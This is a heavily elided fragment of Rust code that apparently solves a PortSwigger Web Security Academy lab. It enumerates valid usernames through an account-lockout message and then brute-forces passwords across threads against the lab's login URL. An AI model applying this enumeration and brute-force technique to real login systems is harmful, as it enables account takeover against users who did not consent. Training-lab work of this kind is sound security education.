...
*******************/
fn main() {
    let url = "https://0a9000d304f97346803fdacd006000f3.web-security-academy.net/login"; // change this to you lab url
    ...
    if VALID_USER.lock().unwrap().len() != 0 {
        ...
        brute_force_password(
            ...
            1, // you can change the number of threads
        );
...
fn enum_usernames(
    ...
    let regex = Regex::new("You have made too many incorrect login attempts").unwrap(); // the pattern to search for in the response
        ...
        for x in 0..4 {
            ...
            for (index, user) in mini_list.iter().enumerate() {
                ...
                if VALID_USER.lock().unwrap().len() == 0 {
                    ...
                    let data =
                        HashMap::from([("username", user), ("password", &"not important now")]); // the data sent in the POST login request
...
fn brute_force_password(
    ...
    passwords_chunks.par_iter().for_each(|mini_list| {
        ...
        for (index, password) in mini_list.iter().enumerate() {
            ...
            if VALID_PASSWORD.lock().unwrap().len() == 0 {
                if REQUEST_COUNTER.fetch_add(1, Ordering::Relaxed) % 3 == 0 {
                } else {
